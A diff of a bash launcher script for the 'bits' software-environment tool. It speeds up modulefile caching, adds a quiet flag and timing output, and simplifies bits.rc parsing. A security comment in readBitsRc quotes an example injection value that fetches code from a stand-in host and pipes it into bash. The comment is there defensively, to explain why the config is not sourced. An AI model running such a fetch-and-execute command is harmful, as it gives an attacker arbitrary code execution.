@@ -4,6 +4,11 @@ BITSDIR="$(dirname "$0")"
 
 ARGV=("$@"); ARGC=$#   # ARGC must be a plain integer, not an array
 
+# Optional phase timing for diagnosing slow load/enter: set BITS_TIMING=1 to
+# print the wall time of each phase to stderr. Uses bash EPOCHREALTIME (>=5),
+# else GNU date; no overhead when unset.
+[[ -n "${BITS_TIMING:-}" ]] && _BT_PREV="${EPOCHREALTIME/,/.}" && _BT_PREV="${_BT_PREV:-$(date +%s.%N 2>/dev/null || echo 0)}"
+
 function printHelp() {
 cat >&2 <<EoF
 $PROG -- load environment for bits packages through modulefiles
@@ -24,8 +29,8 @@ Usage: $0 \\
     ${EM}help${EZ}
       This help screen.
 
-    ${EM}enter${EZ} [${ET}--shellrc${EZ}] [${ET}--dev${EZ}] MODULE1[,MODULE2...]
-      Enters a new shell with the given modules loaded.
+    ${EM}enter${EZ} [${ET}-q${EZ}] [${ET}--shellrc${EZ}] [${ET}--dev${EZ}] MODULE1[,MODULE2...]
+      Enters a new shell with the given modules loaded (${ET}-q${EZ} silences the module-load messages).
       Return to the clean environment by exiting the shell with ${ET}exit${EZ}.
       Inside the environment you can use the native ${ET}modulecmd${EZ}.
       By default you enter the same shell type you are in. Override with environment variable ${ET}MODULES_SHELL${EZ}.
@@ -34,9 +39,9 @@ Usage: $0 \\
       If you want to add environment variables for development use ${ET}--dev${EZ}
       Alternatively you can use the ${EM}load${EZ} command in the current shell.
 
-    ${EM}setenv${EZ} MODULE1[,MODULE2...] ${ET}-c${EZ} cmdInEnvironment [PARAM1 [PARAM2...]]
+    ${EM}setenv${EZ} [${ET}-q${EZ}] MODULE1[,MODULE2...] ${ET}-c${EZ} cmdInEnvironment [PARAM1 [PARAM2...]]
       Executes the given command with environment defined by the given modules.
-      Everything after ${ET}-c${EZ} is executed as-is.
+      Everything after ${ET}-c${EZ} is executed as-is.  Use ${ET}-q${EZ} to silence the module-load messages.
       Exit code is preserved.
       Example: $ET$0 setenv AliRoot/v5-08-02-1 -c aliroot -b$EZ
 
@@ -111,33 +116,107 @@ function detectShell() {
   esac
 }
 
+function _listPkgVersions() {
+  # Emit the <pkg>/<version> directories under the install tree (the input the
+  # module-collection loop consumes).
+  #
+  # Fast path: when the tree is served from CVMFS, ask its serving catalog via
+  # the bitsModules helper — one HTTP fetch + a local SQLite query — instead of
+  # a per-file FUSE walk. The helper exits non-zero (fall-back contract) when
+  # its single-dedicated-catalog convention does not hold, in which case we use
+  # the POSIX `find` walk. Off CVMFS we go straight to find (no python spawn).
+  local dir="$1" real bm
+  real=$(readlink -f "$dir" 2> /dev/null || echo "$dir")
+  if [[ "$real" == /cvmfs/* ]]; then
+    bm=$(command -v bitsModules 2> /dev/null || echo "${BITSDIR}/bitsModules")
+    if [[ -x "$bm" ]] && "$bm" "$dir" --depth2-dirs 2> /dev/null; then
+      return 0
+    fi
+  fi
+  find "$dir" -maxdepth 2 -mindepth 2 2> /dev/null
+}
+
 function collectModules() {
-  if [[ -z "$NO_REFRESH" ]]; then
-    # Collect all modulefiles in one place.
-    # Guard against empty variables before any rm -rf to prevent accidental
-    # deletion of paths like /MODULES/ if WORK_DIR or ARCHITECTURE is unset.
-    [[ -n "$WORK_DIR" && -n "$ARCHITECTURE" ]] || \
-      { printf "${ER}ERROR: WORK_DIR or ARCHITECTURE is empty; cannot refresh modules${EZ}\n" >&2; return 1; }
-    rm -rf "${WORK_DIR}/MODULES/${ARCHITECTURE}"
-    mkdir -p "${WORK_DIR}/MODULES/${ARCHITECTURE}/BASE"
-    cat > "${WORK_DIR}/MODULES/${ARCHITECTURE}/BASE/1.0" <<EOF
+  if [[ -n "$NO_REFRESH" ]]; then
+    printf "${EY}WARNING: not updating modulefiles${EZ}\n" >&2
+    return 0
+  fi
+  # Guard against empty variables before any rm to prevent accidental deletion
+  # of paths like /MODULES/ if WORK_DIR or ARCHITECTURE is unset.
+  [[ -n "$WORK_DIR" && -n "$ARCHITECTURE" ]] || \
+    { printf "${ER}ERROR: WORK_DIR or ARCHITECTURE is empty; cannot refresh modules${EZ}\n" >&2; return 1; }
+  local mroot="${WORK_DIR}/MODULES/${ARCHITECTURE}"
+  local iroot="${WORK_DIR}/${ARCHITECTURE}"
+  local stamp="$mroot/.bits_sync_stamp"
+  mkdir -p "$mroot/BASE"
+  cat > "$mroot/BASE/1.0" <<EOF
 #%Module1.0
-set base_path ${WORK_DIR}/${ARCHITECTURE}
+set base_path ${iroot}
 setenv BASEDIR \$base_path
 set osname [uname sysname]
 set osarchitecture [uname machine]
 EOF
-    while read -r PKG; do
-      PKGVER=${PKG##*/}
-      PKGNAME=${PKG%/*}
-      PKGNAME=${PKGNAME##*/}
-      [[ ! -e "$PKG/etc/modulefiles/$PKGNAME" ]] && continue
-      mkdir -p "${WORK_DIR}/MODULES/${ARCHITECTURE}/${PKGNAME}"
-      cp "$PKG/etc/modulefiles/$PKGNAME" "${WORK_DIR}/MODULES/${ARCHITECTURE}/${PKGNAME}/${PKGVER}"
-    done < <(find "${WORK_DIR}/${ARCHITECTURE}" -maxdepth 2 -mindepth 2 2> /dev/null)
-  else
-    printf "${EY}WARNING: not updating modulefiles${EZ}\n" >&2
+  # Fast skip: the per-package stat/copy walk below is O(N) and, on a slow
+  # filesystem, dominates load/enter (seconds). If nothing in the install tree
+  # has changed since the last successful sync, the cache is already current —
+  # detect that with one shallow `find -newer` (the same cheap traversal as a
+  # bare find) and return. -maxdepth 2 includes the arch dir and the per-package
+  # dirs, so package add/remove and version re-symlinks all bump a checked mtime.
+  if [[ -f "$stamp" ]] && \
+     [[ -z "$(find "$iroot" -maxdepth 2 -newer "$stamp" 2> /dev/null | head -1)" ]]; then
+    return 0
   fi
+  # Incremental sync: copy a modulefile into the cache only when it is missing
+  # or newer than the cached copy, then drop cache entries whose source has
+  # vanished. After a build with no module changes this copies nothing.
+  local PKG PKGVER PKGNAME src dest
+  while read -r PKG; do
+    [[ -n "$PKG" ]] || continue
+    PKGVER=${PKG##*/}
+    PKGNAME=${PKG%/*}; PKGNAME=${PKGNAME##*/}
+    src="$PKG/etc/modulefiles/$PKGNAME"
+    [[ -e "$src" ]] || continue
+    dest="$mroot/$PKGNAME/$PKGVER"
+    if [[ ! -e "$dest" || "$src" -nt "$dest" ]]; then
+      mkdir -p "$mroot/$PKGNAME"
+      cp "$src" "$dest"
+    fi
+  done < <(_listPkgVersions "$iroot")
+  # Prune cache entries whose source modulefile no longer exists (deleted
+  # package/version). Walk the (small) cache tree with plain find — no GNU
+  # -printf, for macOS portability.
+  local DESTFILE rel pkg ver d
+  while read -r DESTFILE; do
+    [[ -n "$DESTFILE" ]] || continue
+    rel=${DESTFILE#"$mroot/"}
+    pkg=${rel%/*}; ver=${rel##*/}
+    [[ "$pkg" == BASE ]] && continue
+    [[ -e "$iroot/$pkg/$ver/etc/modulefiles/$pkg" ]] || rm -f "$DESTFILE"
+  done < <(find "$mroot" -mindepth 2 -maxdepth 2 -type f 2> /dev/null)
+  # Remove now-empty package directories (rmdir only deletes empties; keep BASE).
+  for d in "$mroot"/*/; do
+    [[ "$(basename "$d")" == BASE ]] && continue
+    rmdir "$d" 2> /dev/null || true
+  done
+  # Stamp the sync so the next call can fast-skip when nothing changed.
+  : > "$stamp" 2> /dev/null || true
+}
+
+function listAvailableModules() {
+  # Emit <pkg>/<version> for every installed package that ships a modulefile,
+  # read straight from the install tree (the source of truth) via the same fast
+  # path collectModules uses. This is what `bits q` lists: it avoids rebuilding
+  # the MODULES cache (rm -rf + re-cp of every modulefile) and spawning
+  # `modulecmd avail` just to enumerate — the two costs that make `q` slow on a
+  # real filesystem. Output is unsorted; callers pipe through sort.
+  local base="${WORK_DIR}/${ARCHITECTURE}" P pkgver pkgname
+  [[ -d "$base" ]] || return 0
+  while read -r P; do
+    [[ -n "$P" ]] || continue
+    pkgver=${P##*/}
+    pkgname=${P%/*}; pkgname=${pkgname##*/}
+    [[ -e "$P/etc/modulefiles/$pkgname" ]] && printf '%s/%s\n' "$pkgname" "$pkgver"
+  done < <(_listPkgVersions "$base")
 }
 
 function normModules() {
@@ -156,8 +235,17 @@ function normModules() {
 }
 
 function existModules() {
-  local MODULE
+  # A bits module <pkg>[/<version>] is present iff it exists in the modulefile
+  # cache: <pkg>/<version> is a file, a bare <pkg> a directory. Test that
+  # directly — instant — instead of spawning `modulecmd avail` (a full-tree
+  # scan/evaluate) once per requested module, which was the main reason
+  # load/enter/printenv were notably slower than q. Fall back to modulecmd only
+  # when the direct lookup misses, so extra MODULEPATH entries and
+  # default-version aliases still resolve. The `..` guard keeps the fast path
+  # from matching path-traversal names (modulecmd then rejects them).
+  local MODULE mroot="${WORK_DIR}/MODULES/${ARCHITECTURE}"
   for MODULE in "$@"; do
+    [[ "$MODULE" != *..* && -e "$mroot/$MODULE" ]] && continue
     $MODULECMD bash -t avail 2>&1 | grep -qFx "$MODULE" || \
       { printf "${ER}ERROR: $MODULE was not found${EZ}\n" >&2; return 1; }
   done
@@ -168,82 +256,88 @@ function stripDyld() {
   [ ! "X$TO_STRIP" = X ] && echo unset $TO_STRIP && echo ';'
 }
 
+function _bt_mark() {
+  # Print elapsed wall time since the previous mark (only when BITS_TIMING set).
+  [[ -n "${BITS_TIMING:-}" ]] || return 0
+  local now="${EPOCHREALTIME/,/.}"; now="${now:-$(date +%s.%N 2>/dev/null || echo 0)}"
+  [[ -n "${_BT_PREV:-}" ]] && \
+    awk -v a="$_BT_PREV" -v b="$now" -v l="$1" 'BEGIN{printf "[timing] %-14s %7.3fs\n", l, b-a}' >&2
+  _BT_PREV="$now"
+}
+
 function readBitsRc() {
-  # SECURITY: never source the config file or its derived content directly.
-  # Sourcing key=value pairs allows arbitrary shell-code injection via crafted
-  # config values (e.g.  work_dir = $(curl evil/pwn|bash)).
-  # Instead, extract each known key individually with awk and assign it to
-  # the corresponding variable using a whitelist case statement.
+  # SECURITY: never source the config file (a crafted value like
+  # work_dir = $(curl evil|bash) would execute). The launcher itself needs only
+  # the work directory for module operations; every other bits.rc setting
+  # (config_dir, architecture, defaults, organisation, providers, ...) is read
+  # by the Python layer in bits_helpers/args.py. Extract work_dir with awk —
+  # flat "work_dir = value" or a value inside a leading [bits] section both
+  # work; sw_dir is accepted as a deprecated alias.
   local cfgfile="$1"
   [[ -f "$cfgfile" ]] || return 0
-
-  # Read a single key from a given INI section.  awk stays in section mode
-  # between a [section] header and the next blank line or EOF.  Only the first
-  # occurrence of each key is returned (INI convention).
-  _rc_get() {
-    local section="$1" key="$2"
-    awk -v section="$section" -v key="$key" '
-      /^\[/ { in_section = ($0 == "[" section "]") }
-      in_section && /^[[:space:]]*[^#;]/ {
-        sub(/^[[:space:]]*/, ""); sub(/[[:space:]]*$/, "")
-        if (match($0, "^" key "[[:space:]]*=[[:space:]]*")) {
-          print substr($0, RLENGTH+1)
-          exit
-        }
-      }
-    ' "$cfgfile"
-  }
-
-  # Whitelist of recognised keys → shell variable names.
-  # Only these assignments are ever made; no arbitrary execution is possible.
-  local val
-  for mapping in \
-      "organisation:organisation" \
-      "branding:branding" \
-      "search_path:search_path" \
-      "repo_dir:repo_dir" \
-      "sw_dir:sw_dir" \
-      "pkg_prefix:pkg_prefix"
-  do
-    local key="${mapping%%:*}"
-    local var="${mapping##*:}"
-    val="$(_rc_get "bits" "$key")"
-    # Also check the organisation-specific section if organisation is known.
-    if [[ -z "$val" && -n "$organisation" ]]; then
-      val="$(_rc_get "$organisation" "$key")"
-    fi
-    [[ -n "$val" ]] && printf -v "$var" '%s' "$val" || true
-  done
+  work_dir="$(awk '
+    { line=$0; sub(/^[[:space:]]*/,"",line); sub(/[[:space:]]*$/,"",line)
+      if (line ~ /^(work_dir|sw_dir)[[:space:]]*=/) {
+        sub(/^(work_dir|sw_dir)[[:space:]]*=[[:space:]]*/,"",line)
+        print line; exit } }' "$cfgfile")"
   return 0
 }
 
+function checkLegacyBitsRc() {
+  # The bits.rc format was simplified. Reject old-style files loudly rather
+  # than silently ignoring renamed/removed keys. Old markers: the deprecated
+  # keys below, or any section other than [bits].
+  local cfgfile="$1"
+  [[ -f "$cfgfile" ]] || return 0
+  local bad
+  bad="$(awk '
+    /^[[:space:]]*\[/ {
+      if ($0 !~ /^[[:space:]]*\[bits\][[:space:]]*$/) { print "  section " $0 } ; next }
+    /^[[:space:]]*(repo_dir|sw_dir|search_path|pkg_prefix|branding)[[:space:]]*=/ {
+      k=$0; sub(/^[[:space:]]*/,"",k); sub(/[[:space:]]*=.*/,"",k); print "  key    " k }
+  ' "$cfgfile")"
+  [[ -z "$bad" ]] && return 0
+  {
+    echo "ERROR: $cfgfile uses the old bits.rc format. Offending entries:"
+    echo "$bad"
+    echo
+    echo "Please update it (keep a single [bits] section):"
+    echo "  repo_dir     -> config_dir"
+    echo "  sw_dir       -> work_dir"
+    echo "  search_path  -> removed; set BITS_PATH (e.g. export BITS_PATH=lcg) or use a provider"
+    echo "  pkg_prefix   -> removed; the display prefix comes from the aliBuild wrapper (BITS_PKG_PREFIX)"
+    echo "  branding     -> removed"
+    echo "Per-organisation [NAME] sections are no longer supported."
+    echo
+    echo "Example:"
+    echo "  [bits]"
+    echo "  organisation = stacks"
+    echo "  config_dir   = ."
+  } >&2
+  exit 1
+}
+
 function configBits() {
-
-  # Backward compatibility defaults
-
-  BITS_BRANDING=${BITS_BRANDING:-"bits"}
-  BITS_PATH=${BITS_PATH:-""}
-  BITS_REPO_DIR=${BITS_REPO_DIR:-"alidist"}
+  # Backward-compatibility default for the work directory. NOTE: the display
+  # prefix (BITS_PKG_PREFIX) and branding come from the ENVIRONMENT only — the
+  # aliBuild wrapper exports them for ALICE-style "VO_ALICE@pkg::ver" output;
+  # an empty BITS_PKG_PREFIX makes `bits q` print the native "<pkg>/<version>".
+  # organisation (registry/provider selection) and all other settings are
+  # handled by the Python layer, not here.
   BITS_WORK_DIR=${BITS_WORK_DIR:-"sw"}
-  BITS_ORGANISATION=${BITS_ORGANISATION:-"ALICE"}
-  BITS_PKG_PREFIX=${BITS_PKG_PREFIX:-"VO_"$BITS_ORGANISATION}
-    
-  cfile=""
 
+  cfile=""
   for cfg in "$1" bits.rc .bitsrc "$HOME/.bitsrc"
   do
     [[ -n "$cfg" && -f "$cfg" ]] && { cfile="$cfg"; break; }
   done
 
+  local work_dir=
+  [[ -n "$cfile" ]] && checkLegacyBitsRc "$cfile"
   [[ -n "$cfile" ]] && readBitsRc "$cfile"
-    
-  export BITS_ORGANISATION=${organisation:-$BITS_ORGANISATION}
-  export BITS_BRANDING=${branding:-$BITS_BRANDING}
-  export BITS_PATH=${search_path:-$BITS_PATH}
-  export BITS_REPO_DIR=${repo_dir:-$BITS_REPO_DIR}
-  export BITS_WORK_DIR=${sw_dir:-$BITS_WORK_DIR}
-  export BITS_PKG_PREFIX=${pkg_prefix:-$BITS_PKG_PREFIX}
 
+  export BITS_WORK_DIR=${work_dir:-$BITS_WORK_DIR}
+  export BITS_PKG_PREFIX=${BITS_PKG_PREFIX:-}
 }
 
 config_file=""
@@ -269,7 +363,7 @@ set -- "${new_args[@]}"
 for arg in "$@"
 do
   case $arg in
-    analytics|architecture|build|clean|cleanup|deps|doctor|init|version|-debug|-d)
+    analytics|architecture|brew|build|clean|cleanup|deps|doctor|init|publish|stats|status|verify|version|-debug|-d)
          mkdir -p "$BITS_WORK_DIR" || echo "Cannot create directory: $BITS_WORK_DIR"
         "$BITSDIR/bitsBuild" "$@"
 	    exit $?
@@ -398,9 +492,41 @@ if [[ -z "$WORK_DIR" ]]; then
 fi
 [[ ! -d "$WORK_DIR" ]] && { printHelp "Work dir $WORK_DIR cannot be accessed"; false; }
 WORK_DIR=$(cd "$WORK_DIR"; pwd)
-[[ -z "$ARCHITECTURE" ]] && ARCHITECTURE="$("bitsBuild" architecture 2> /dev/null || true)"
-[[ -z "$ARCHITECTURE" ]] && ARCHITECTURE="$("$BITSDIR/bitsBuild" architecture 2> /dev/null || true)"
-[[ -z "$ARCHITECTURE" || "$ARCHITECTURE" == "<unknown>" ]] && ARCHITECTURE=$(ls -1t "$WORK_DIR" 2>/dev/null | grep -vE '^[A-Z]+$' | head -n1)
+# Remember whether the architecture was given explicitly (-a); if so, respect it
+# verbatim and never second-guess it below.
+_bt_mark startup            # script start → here (configBits, option/work-dir parsing)
+_ARCH_GIVEN=; [[ -n "$ARCHITECTURE" ]] && _ARCH_GIVEN=1
+# Architecture autodetection (when -a not given). MODULES-first: for q/load/enter
+# the installed module trees are the source of truth, so choose from them
+# directly and skip the bitsBuild (python) host-arch spawn entirely in the common
+# single-arch case. A real arch has a $WORK_DIR/MODULES/<arch> dir; sw/ also holds
+# non-arch dirs (wrapper-scripts) which are excluded by going via MODULES. Fall
+# back to python only to disambiguate several installed arches (prefer the host's)
+# or when nothing is installed yet (e.g. a first build).
+if [[ -z "$_ARCH_GIVEN" ]]; then
+  _present=()
+  for _a in $(ls -1t "$WORK_DIR/MODULES" 2> /dev/null); do
+    [[ -d "$WORK_DIR/MODULES/$_a" ]] && _present+=("$_a")
+  done
+  if [[ ${#_present[@]} -eq 1 ]]; then
+    ARCHITECTURE="${_present[0]}"            # sole installed arch — no python spawn
+  elif [[ ${#_present[@]} -gt 1 ]]; then
+    # Several present: prefer the host's native arch if installed, else newest.
+    _host="$("bitsBuild" architecture 2> /dev/null || "$BITSDIR/bitsBuild" architecture 2> /dev/null || true)"
+    ARCHITECTURE=
+    for _a in "${_present[@]}"; do [[ "$_a" == "$_host" ]] && { ARCHITECTURE="$_a"; break; }; done
+    if [[ -z "$ARCHITECTURE" ]]; then
+      ARCHITECTURE="${_present[0]}"          # ls -1t → most recently built
+      printf "${EY}NOTE: several architectures present; selected most recent: %s${EZ}\n" "$ARCHITECTURE" >&2
+      printf "${EY}      (override with  bits -a <arch> %s)${EZ}\n" "${ACTION:-q}" >&2
+    fi
+  else
+    # Nothing installed yet → host arch from python (e.g. for a first build).
+    ARCHITECTURE="$("bitsBuild" architecture 2> /dev/null || true)"
+    [[ -z "$ARCHITECTURE" ]] && ARCHITECTURE="$("$BITSDIR/bitsBuild" architecture 2> /dev/null || true)"
+  fi
+fi
+_bt_mark archdetect         # arch autodetect (python spawn only when needed)
 [[ -z "$ARCHITECTURE" ]] && { printHelp "Cannot autodetect architecture"; false; }
 
 # Look for modulecmd (v3) or modulecmd-compat (>= v4)
@@ -417,13 +543,20 @@ fi
 export MODULEPATH="$WORK_DIR/MODULES/$ARCHITECTURE${MODULEPATH:+":$MODULEPATH"}"
 MODULEPATH=$(echo "$MODULEPATH" | sed -e 's/::*/:/g; s/^://; s/:$//')
 IGNORE_ERR="Unable to locate a modulefile for 'Toolchain/"
+# -q (which unsets VERBOSE) silences environment-modules' "Loading <pkg>" /
+# "Loading requirement:" progress lines so setenv/printenv/load/enter output can
+# be captured/parsed cleanly. Honoured by environment-modules >= 4.
+[[ -z "${VERBOSE:-}" ]] && export MODULES_VERBOSITY=silent
 case "$ACTION" in
   enter)
     [[ $BITSLVL == 1 ]] || \
       { printf "${ER}ERROR: already in an bits environment${EZ}\n" >&2; exit 1; }
     MODULES=$(normModules "${ARGS[@]}")
+    _bt_mark preamble
     collectModules
+    _bt_mark collectModules
     existModules $MODULES
+    _bt_mark existModules
     PS1DEV=
     if [[ $DEVOPT == 1 ]];then
       PS1DEV=" (dev)"
@@ -439,6 +572,7 @@ case "$ACTION" in
     else
       eval $($MODULECMD bash add $MODULES 2> >(grep -v "$IGNORE_ERR" >&2))
     fi
+    _bt_mark modulecmd
     [[ $UNAME == Darwin ]] && eval $(stripDyld)
     detectShell
     if [[ ! -z "$CLEAN_ENV" ]]; then
@@ -460,7 +594,8 @@ case "$ACTION" in
   printenv|load|unload)
     [[ $ACTION == printenv ]] && ACTION=load
     MODULES=$(normModules "${ARGS[@]}")
-    [[ $ACTION == load ]] && { collectModules; existModules $MODULES; }
+    _bt_mark preamble
+    [[ $ACTION == load ]] && { collectModules; _bt_mark collectModules; existModules $MODULES; _bt_mark existModules; }
     [[ $VERBOSE == 1 ]] && printf "${ET}Use ${EM}bits list${ET} to list loaded modules.${EZ}\n" >&2
     if [[ $DEVOPT == 1 ]];then
       echo "Warning: Development mode for '$ACTION' is not supported via bits. Please remove '--dev' or run manually shown below" >&2
@@ -475,6 +610,7 @@ case "$ACTION" in
     fi
     detectShell
     $MODULECMD $MODULES_SHELL $ACTION $MODULES 2> >(grep -v "$IGNORE_ERR" >&2)
+    _bt_mark modulecmd
     [[ $UNAME == Darwin ]] && ( eval $($MODULECMD $MODULES_SHELL $ACTION $MODULES 2> /dev/null) &> /dev/null; stripDyld )
     exit 0
   ;;
@@ -490,10 +626,17 @@ case "$ACTION" in
   ;;
   q|query)
     [[ -z "${ARGS[0]}" ]] && SEARCH_CMD=cat || SEARCH_CMD=( grep -iE "${ARGS[0]}" )
-    collectModules
-    $MODULECMD bash -t avail 2>&1 | grep -E '^[^/]+/[^/]+$' | grep -vE ':$' | \
-      "${SEARCH_CMD[@]}" | sed -e 's!^\([^/]*\)/\(.*\)$!'${BITS_PKG_PREFIX}'@\1::\2!'
-    exit ${PIPESTATUS[3]}  # grep
+    # Native module names are <pkg>/<version>. With a display prefix set (e.g.
+    # via the aliBuild wrapper) reformat to <PREFIX>@<pkg>::<version>; with no
+    # prefix, pass the native form through unchanged.
+    if [[ -n "$BITS_PKG_PREFIX" ]]; then
+      _fmt=( sed -e 's!^\([^/]*\)/\(.*\)$!'"${BITS_PKG_PREFIX}"'@\1::\2!' )
+    else
+      _fmt=( cat )
+    fi
+    # List straight from the install tree (no MODULES rebuild, no modulecmd).
+    listAvailableModules | LC_ALL=C sort | "${SEARCH_CMD[@]}" | "${_fmt[@]}"
+    exit ${PIPESTATUS[2]}  # SEARCH grep
   ;;
   avail)
     collectModules
